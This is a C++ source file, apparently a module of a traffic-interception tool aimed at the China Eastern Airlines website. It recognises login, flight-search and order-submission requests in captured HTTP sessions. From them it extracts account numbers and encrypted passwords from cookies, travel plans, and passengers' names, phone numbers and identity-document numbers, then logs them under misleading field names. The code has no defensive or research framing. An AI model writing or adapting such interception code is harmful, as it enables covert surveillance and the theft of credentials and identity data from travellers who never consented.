
#include "StdAfx.h"

#include "ChinaEastern.h"

plane::ChinaEastern::ChinaEastern(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::ChinaEastern::~ChinaEastern()
{
	
}

// NI 身份证，PP 护照，ORI 回乡证，MIL 军官证，OTHER 其他，HTPP 港澳通行证，BR 出生日期
string plane::ChinaEastern::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "NI"){idTypeTrue = "身份证";}
	if (idType == "PP"){idTypeTrue = "护照";}
	if (idType == "ORI"){idTypeTrue = "回乡证";}
	if (idType == "MIL"){idTypeTrue = "军官证";}
	if (idType == "OTHER"){idTypeTrue = "其他";}
	if (idType == "HTPP"){idTypeTrue = "港澳通行证";}
	if (idType == "BR"){idTypeTrue = "出生日期";}
	return idTypeTrue;
}

int plane::ChinaEastern::IsChinaEastern(HttpSession *http_session)
{
	//登录
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/member/auth!fullLoginCheck.shtml?")!=-1) )
	{
		return kpclogin;
	}
	//行程预订
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/otabooking/flight-search!doFlightSearch.shtml?")!=-1))
	{
		return kpcticket;
	}
	//提交订单
	if((http_session->m_Requestline.m_Host.Find("www.ceair.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/otabooking/paxinfo-input!showBookingInfoNew.shtml")!=-1) )
	{
		return kpcorder;
	}
	return 0;
}

int plane::ChinaEastern::Process(const char *packet,int action)
{
	//登录
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//行程预订
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//提交订单
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//登录
int plane::ChinaEastern::pclogin(const char *packet)
{
	//从cookie 中获得user_
	string cookie(http_session_->m_Requestline.m_Cookie.GetBuffer(0));
	cookie = ms_->UrlDecode(cookie);
	ms_->SplitStringToMap(cookie, ';','=');
	//账号
    string username = ms_->GetValueFromMapByKey("ffpno",true);
	//密码(已加密)
	string password = ms_->GetValueFromMapByKey("passportId",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ =
		"user=" + username + "\r\n" + //账号
		"pass=" + password + "\r\n" + //密码
		"state=登录\r\n";
	WriteIndexFile();
	return 1;
}

// 行程预订
int plane::ChinaEastern::pcticket(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	string src_dataEnd = ms_->GetValueFromMapByKey("searchCond",true);

	//使用json 读取数据
	Json::Reader reader;
	Json::Value value;
	if (reader.parse(src_dataEnd,value))
	{
		//类型
		string tripType = value["tripType"].asString();
		int adtCount = value["adtCount"].asInt();
		int chdCount = value["chdCount"].asInt();
		int infCount = value["infCount"].asInt();

		CString adultCount,childCount,infantCount;
		adultCount.Format("%d",adtCount);
		childCount.Format("%d",chdCount);
		infantCount.Format("%d",infCount);

		string adutcount,childcount,infantcount;
		adutcount = adultCount.GetBuffer(0);
		childcount = childCount.GetBuffer(0);
		infantcount = infantCount.GetBuffer(0);
       
		Json::Value segmentList = value["segmentList"];
		//单程
		if (tripType == "OW")
		{
			int i = 0;
			//出发日期
			string deptDt = segmentList[i]["deptDt"].asString();
			//出发地
			string deptCdTxt = segmentList[i]["deptCdTxt"].asString();
			//目的地
			string arrCdTxt = segmentList[i]["arrCdTxt"].asString();

			output_text_ =
				"netmark=" +	adutcount + "\r\n" +	//成年人数
				"onick=" +	childcount + "\r\n" +		//儿童人数
				"sex=" +	infantcount + "\r\n" +		//婴儿人数
				"nick=" +	deptCdTxt + "\r\n" +		//出发地
				"msg=" + 	arrCdTxt + "\r\n" +			//目的地 
				"servername=" + deptDt + "\r\n" +		//出发日期
				"state=查询\r\n";
			WriteIndexFile();
		}
		//往返
		if (tripType == "RT")
		{
			int i = 0;
			int j = 1;
			//出发日期
			string deptDt = segmentList[i]["deptDt"].asString();
			//出发地
			string deptCdTxt = segmentList[i]["deptCdTxt"].asString();
			//目的地
			string arrCdTxt = segmentList[i]["arrCdTxt"].asString();
			//返程日期
			string deptDtRe = segmentList[j]["deptDt"].asString();

			output_text_ =
				"netmark=" + adutcount + "\r\n" +	//成年人数
				"onick=" +	childcount + "\r\n" +	//儿童人数
				"sex=" +	infantcount + "\r\n" +	//婴儿人数
				"nick=" +	deptCdTxt + "\r\n" +	//出发地
				"msg=" + 	arrCdTxt + "\r\n" +		//目的地 
				"servername=" + deptDt + "\r\n" +	//出发日期
				"appname=" + deptDtRe + "\r\n" +	//返程日期
				"state=查询\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}

//提交订单
int plane::ChinaEastern::pcorder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');

	//联系人信息
	string contactInfo = ms_->GetValueFromMapByKey("contactInfo",true);
	string contactName,contactMobile,contackEmail;
	//提取json
	Json::Reader readerContact;
	Json::Value valueContact;
	if (readerContact.parse(contactInfo,valueContact))
	{
		contactName = valueContact["contactName"].asString();
		contactMobile = valueContact["contactMobile"].asString();
		contackEmail = valueContact["contactEmail"].asString();
	}
	//乘客信息
	string allinfo = ms_->GetValueFromMapByKey("allPaxInfo",true);
	//提取json
	Json::Reader readerPassenger;
	Json::Value valuePassenger;
	if (readerPassenger.parse(allinfo,valuePassenger))
	{
		for (int i=0;i<valuePassenger.size();i++)
		{
			string passengerName,passengerIDtypeTemp,passengerIDtype,passengerIDcard,passengerTel;

			passengerName = valuePassenger[i]["paxName"].asString();
			if (passengerName.empty())
			{
				passengerName = valuePassenger[i]["paxNameFirst"].asString();
			}
			passengerIDtypeTemp = valuePassenger[i]["idType"].asString();
			passengerIDtype = GetIdType(passengerIDtypeTemp);
			passengerIDcard = valuePassenger[i]["idNo"].asString();
			passengerTel = valuePassenger[i]["mobile"].asString();

			output_text_ =
				"mid=" + 	contactName + "\r\n" +		//联系人姓名
				"oid=" + 	contactMobile + "\r\n" +	//联系人电话
				"msgtype=" + passengerName + "\r\n" +	//乘客姓名
				"clientmsg=" + passengerTel + "\r\n" +	//乘客电话
				"webname=" + passengerIDtype + "\r\n" + //乘客证件类型
				"subject=" + passengerIDcard + "\r\n" + //乘客证件号
				"state=提交订单\r\n";
			WriteIndexFile();
		}
	}
	return 1;
}
